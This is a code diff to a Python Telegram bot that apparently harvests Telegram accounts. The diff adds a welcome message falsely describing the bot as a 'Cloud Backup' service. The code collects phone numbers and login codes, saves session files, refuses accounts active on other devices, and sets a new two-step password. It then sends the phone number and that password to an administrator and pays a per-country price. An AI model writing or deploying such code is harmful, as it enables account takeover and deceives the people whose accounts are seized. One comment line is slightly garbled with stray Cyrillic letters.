@@ -99,7 +99,7 @@ def get_current_file_count(country_code):
     return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
 
 @app.route('/')
-def home(): return "Bot Server Is Active!"
+def home(): return "Bot Server Running Perfectly!"
 
 def run_web():
     port = int(os.environ.get("PORT", 8080))
@@ -145,29 +145,30 @@ def admin_panel_command(message):
         panel_msg += f"• 🌍 `+{code}` ➜ Price: **${prc}** | Cap: **{cap}**\n"
     bot.send_message(message.chat.id, panel_msg, reply_markup=get_admin_panel_keyboard())
 
-# ==================== ফ্রন্টএন্ড ইউজার কম্যান্ডস (স্ক্রিনশট ম্যাচড) ====================
+# ==================== ফ্রন্টএন্ড ইউজার কম্যান্ডস ====================
 
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    # স্ক্রিনশট অনুযায়ী ইউজার স্টার্ট মেসেজ
-    bot.send_message(message.chat.id, "default welcome text")
+    # কোনো ফরোয়ার্ডেড বা চ্যানেলের লিংক ছাড়া একদম ক্লিন টেক্সট
+    welcome_text = (
+        "👋 **Welcome to Cloud Backup Telegram Bot**\n\n"
+        "To start a secure backup of your Telegram Account, please send your phone number with your country code.\n"
+        "Example: `+88017XXXXXXXX` or `+52XXXXXXXXXX`"
+    )
+    bot.send_message(message.chat.id, welcome_text)
 
 @bot.message_handler(commands=['cancel'])
 def cancel_command(message):
     user_id = message.from_user.id
     if user_id in user_data:
-        try:
-            user_data[user_id]["client"].disconnect()
-        except:
-            pass
+        try: user_data[user_id]["client"].disconnect()
+        except: pass
         del user_data[user_id]
-    # স্ক্রিনশট অনুযায়ী ক্যানসেল রেসপন্স
     bot.send_message(message.chat.id, "❌ **Cancelled.**\n\nYou can send a new phone number to start again.")
 
 @bot.message_handler(commands=['capacity'])
 def capacity_command(message):
     settings = load_settings()
-    # স্ক্রিনশট অনুযায়ী ক্যাপাসিটি লেআউট জেনারেশন
     response = f"👍 **Available Countries : ({len(settings['country_prices'])})**:\n\n"
     for code in settings["country_prices"]:
         prc = settings["country_prices"][code]
@@ -182,7 +183,6 @@ def account_command(message):
     current_time = datetime.now().strftime("%m/%d/%y")
     current_clock = datetime.now().strftime("%H:%M:%S")
     
-    # স্ক্রিনশট অনুযায়ী একাউন্ট প্রোফাইল লেআউট
     response = (
         f"👤 **ID : {user_id}**\n\n"
         f"✅ Number of verified accounts : {stats['verified']}\n"
@@ -201,17 +201,16 @@ def account_command(message):
 def withdraw_command(message):
     user_id = message.from_user.id
     stats = get_user_stats(user_id)
-    # স্ক্রিনশট অনুযায়ী মিনিমাম ৫ টি অ্যাকাউন্ট কন্ডিশন অ্যালার্ট
     if stats['verified'] < 5:
         bot.send_message(message.chat.id, "⚠️ **Minimum withdrawal is at least 5 account(s).**")
     else:
-        bot.send_message(message.chat.id, "✅ উইথড্রল রিকোয়েস্ট প্রসেস করা হচ্ছে। এডমিন শীঘ্রই আপনার সাথে যোগাযোগ করবেন।")
+        bot.send_message(message.chat.id, "✅ Your withdrawal request has been submitted to the admin.")
 
 @bot.message_handler(commands=['withdrawhistory'])
 def withdraw_history_command(message):
     bot.send_message(message.chat.id, "📜 Your withdrawal history is empty.")
 
-# ==================== ব্যাকএন্ড অটোমেশন ও ওটিপি প্রসেসিং ====================
+# ==================== ব্যাকএন্ড অটোমেশন ও ওটিপি প্রсеসিং ====================
 
 async def send_otp_task(phone_number, user_id, message):
     settings = load_settings()
@@ -254,7 +253,6 @@ async def process_security_and_backup(user_id, message, data, current_client):
     await asyncio.sleep(delay)
     
     try:
-        # ডিভাইস কমপ্লায়েন্স এবং সিকিউরিটি চেক
         authorizations = await current_client(functions.account.GetAuthorizationsRequest())
         other_devices = []
         for auth in authorizations.authorizations:
@@ -262,12 +260,11 @@ async def process_security_and_backup(user_id, message, data, current_client):
                 other_devices.append(f"📱 {auth.device_model} ({auth.app_name})")
         
         if len(other_devices) > 0:
-            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="❌ **Backup Failed!** Multiple sessions/devices detected. Please logout other devices first.")
+            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="❌ **Backup Failed!** Multiple devices detected. Please logout other sessions first.")
             await current_client.disconnect()
             if os.path.exists(f"{data['session_path']}.session"): os.remove(f"{data['session_path']}.session")
             return False
 
-        # টু-স্টেপ পাসওয়ার্ড সেটআপ লকিং
         try:
             await current_client(functions.account.UpdatePasswordSettingsRequest(
                 password=tl_types.InputCheckPasswordEmpty(),
@@ -282,8 +279,6 @@ async def process_security_and_backup(user_id, message, data, current_client):
         add_user_account_success(user_id, price)
         
         bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text="✅ **Account successfully backed up and verified!** Balance added to your profile.")
-        
-        # এডমিন লগ নোটিফিকেশন
         bot.send_message(ADMIN_ID, f"🔔 **New Verified Session:**\n🌍 Code: `+{data['country_code']}`\n📱 Phone: `+{data['clean_phone']}`\n🔐 2FA Password: `{sec_password}`")
         return True
 
@@ -349,7 +344,6 @@ def handle_text(message):
     user_id = message.from_user.id
     text = message.text.strip()
 
-    # এডমিন ইন্টারেক্টিভ সেটিংস প্রসেসিং
     if user_id == ADMIN_ID and user_id in admin_state:
         state = admin_state[user_id]
         settings = load_settings()
@@ -376,16 +370,17 @@ def handle_text(message):
                 bot.reply_to(message, f"✅ New Country Added! `+{code.strip()}` Rate: ${prc.strip()} | Limit: {cap.strip()}")
             save_settings(settings)
         except Exception as e:
-            bot.reply_to(message, f"❌ Invalid Input Format. Error: {str(e)}")
+            bot.reply_to(message, f"❌ Invalid Format. Error: {str(e)}")
         return
 
-    # ইউজার ফোন নম্বর ইনপুট ও ভেরিফিকেশন কল
-    if text.startswith("+"):
+    # ইউজার সরাসরি নম্বর টাইপ করলেই প্রসেস চালু হবে (ব্যাকগ্রাউন্ডে সবসময় অন)
+    if text.startswith("+") or text.isdigit():
+        phone = text if text.startswith("+") else f"+{text}"
         bot.reply_to(message, "⏳ Requesting OTP from Telegram Servers...")
-        loop.run_until_complete(send_otp_task(text, user_id, message))
+        loop.run_until_complete(send_otp_task(phone, user_id, message))
     elif user_id in user_data and "phone_code_hash" in user_data[user_id]:
         loop.run_until_complete(verify_otp_task(text, user_id, message))
 
 if __name__ == "__main__":
-    print("--- Clone Architecture Engine Successfully Implemented ---")
+    print("--- Optimized Architecture Active ---")
     bot.infinity_polling(skip_pending=True)
